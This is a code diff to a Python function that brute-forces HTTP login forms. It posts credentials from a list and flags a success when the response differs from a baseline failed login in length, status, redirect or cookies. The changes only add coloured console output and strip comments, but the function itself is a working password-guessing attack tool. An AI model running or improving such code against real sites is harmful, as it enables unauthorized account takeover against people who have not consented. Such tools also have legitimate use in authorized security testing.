@@ -5,7 +5,12 @@ def http_bruteforce(ip, port=80):
     creds = load_credentials()
     url = f"http://{ip}:{port}/"
 
-    print(f"[*] Trying HTTP brute-force on {url}")
+    GREEN = "\033[92m"
+    RED = "\033[91m"
+    YELLOW = "\033[93m"
+    RESET = "\033[0m"
+
+    print(f"{YELLOW}[*] Trying HTTP brute-force on {url}{RESET}")
     session = requests.Session()
 
     headers = {
@@ -14,11 +19,10 @@ def http_bruteforce(ip, port=80):
     }
 
     use_username = input("[?] Does the site require a username? (y/n): ").strip().lower() == 'y'
-
     username_field = input("[?] Enter the name of the username field (default: 'username'): ").strip() or "username"
     password_field = input("[?] Enter the name of the password field (default: 'password'): ").strip() or "password"
 
-    # Baseline failed login to capture "failure fingerprint"
+    # Baseline failed login
     session.cookies.clear()
     fail_data = {password_field: "invalidpass"}
     if use_username:
@@ -27,7 +31,7 @@ def http_bruteforce(ip, port=80):
     try:
         fail_resp = session.post(url, data=fail_data, headers=headers, timeout=5, allow_redirects=False)
     except requests.RequestException as e:
-        print(f"[!] Failed to get baseline response: {e}")
+        print(f"{RED}[!] Failed to get baseline response: {e}{RESET}")
         return None
 
     baseline_length = len(fail_resp.text)
@@ -48,13 +52,12 @@ def http_bruteforce(ip, port=80):
                 data=form_data,
                 headers=headers,
                 timeout=5,
-                allow_redirects=False  # for redirect detection
+                allow_redirects=False
             )
 
             response_cookies = set(session.cookies.get_dict().keys())
             new_cookies = response_cookies - baseline_cookies
 
-            # Compare with baseline to detect success
             diff_len = abs(len(response.text) - baseline_length) > 50
             diff_status = response.status_code != baseline_status
             diff_redirect = response.headers.get("Location", "") != baseline_redirect
@@ -67,13 +70,13 @@ def http_bruteforce(ip, port=80):
 
             if confidence >= 2:
                 user_display = f"{username}:{password}" if use_username else f"{password}"
-                print(f"[+] HTTP login likely successful: {user_display}")
+                print(f"{GREEN}[+] HTTP login likely successful: {user_display}{RESET}")
                 print(f"    -> Response: status {response.status_code}, cookies: {response_cookies}")
                 return (username, password) if use_username else (None, password)
 
         except requests.RequestException as e:
-            print(f"[!] Request failed for {username}:{password} - {e}")
+            print(f"{RED}[!] Request failed for {username}:{password} - {e}{RESET}")
             continue
 
-    print("[-] No valid HTTP credentials found.")
+    print(f"{RED}[-] No valid HTTP credentials found.{RESET}")
     return None
